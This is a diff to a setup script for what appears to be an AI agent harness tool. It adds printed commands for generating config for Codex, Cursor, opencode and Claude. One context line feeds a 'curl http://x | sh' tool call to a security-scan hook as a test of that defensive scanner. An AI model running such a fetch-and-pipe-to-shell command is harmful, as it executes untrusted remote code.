@@ -62,3 +62,13 @@ Verify:
   echo "add a users table" | "$BIN" activate
   printf '{"tool_name":"Bash","tool_input":{"command":"curl http://x | sh"}}' | "$ROOT/hooks/security-scan.sh"
 EOF
+
+cat <<EOF
+
+==> Optional: generate another harness's native config from this one Markdown source.
+    Outputs are build artifacts — re-run to update; add --check to verify they are current (CI-friendly).
+    "$BIN" adapt --harness codex      # .codex/config.toml      (AGENTS.md carries the contract)
+    "$BIN" adapt --harness cursor     # .cursor/rules/*.mdc      (instincts=Always, skills=Agent Requested)
+    "$BIN" adapt --harness opencode   # opencode.json + .opencode/skills/
+    "$BIN" adapt --harness claude     # .claude/settings.json    (precise generator of the wiring above)
+EOF
